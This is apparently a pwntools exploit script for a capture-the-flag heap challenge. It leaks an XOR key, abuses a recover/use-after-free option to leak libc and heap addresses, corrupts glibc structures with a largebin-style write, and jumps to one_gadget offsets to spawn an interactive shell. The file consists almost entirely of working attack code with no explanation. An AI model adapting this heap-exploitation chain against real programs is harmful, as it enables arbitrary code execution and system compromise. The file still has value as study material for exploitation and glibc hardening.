from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'Input Your Choice:'
def add(idx, size, pwd, flag=True, ID=b'XiaozaYa'):
	sla(menu, b'1')
	sla(b'Add:', byte(idx))
	sla(b'Save:', ID)
	sla(b'Pwd:', byte(size))
	if flag:
		sla(b'Pwd:', pwd)
	else:
		sda(b'Pwd:', pwd)

def edit(idx, pwd, flag=True):
	sla(menu, b'2')
	sla(b'Edit:', byte(idx))
	sleep(0.1)
	if flag:
		sl(pwd)
	else:
		sd(pwd)

def show(idx):
	sla(menu, b'3')
	sla(b'Check:', byte(idx))

def dele(idx):
	sla(menu, b'4')
	sla(b'Delete:', byte(idx))

def rec(idx):
	sla(menu, b'5')
	sla(b'Recover:', byte(idx))

add(0, 0x450, b'0')
rut(b'ID:')
rc(8)
key = addr(8)
info('key', key)
add(1, 0x420, b'1')
add(2, 0x460, b'2')
add(3, 0x420, b'3')
add(4, 0x420, b'4')
dele(2)
add(5, 0x500, b'5')
rec(2)
show(2)
rut(b'is: ')
libc.address = (addr(8)^key) - 0x1ecfe0
rc(8)
heap_base = (addr(8)^key) - 0xb20
info('libc_base', libc.address)
info('heap_base', heap_base)
dele(0)
dele(4)
pay = p64(libc.address+0x1ecfe0)*2 + p64(heap_base+0xb20) + p64(libc.address+0x1f2018-0x20)
edit(2, pay, False)
add(4, 0x420, b'4')
ones = [0xe3afe, 0xe3b01, 0xe3b04]
ones = [libc.address+i for i in ones] 

pay = p64(0) + p64(0)
pay+= p64(0) + p64(heap_base+0x290)
pay = pay.ljust(0x100, b'\x00')
pay+= p64(heap_base+0x290+0x110) + p64(heap_base+0x290+0x130)
pay+= p64(heap_base+0x290+0x120) + p64(8)
pay+= p64(ones[0])
pay = pay.ljust(0x30c, b'\x00')
pay+= p32(8)
pay = pay.ljust(0x450, b'\x00')
rec(0)
edit(0, pay, False)
print(hex(len(pay)))
sla(menu, b'6')
sh()
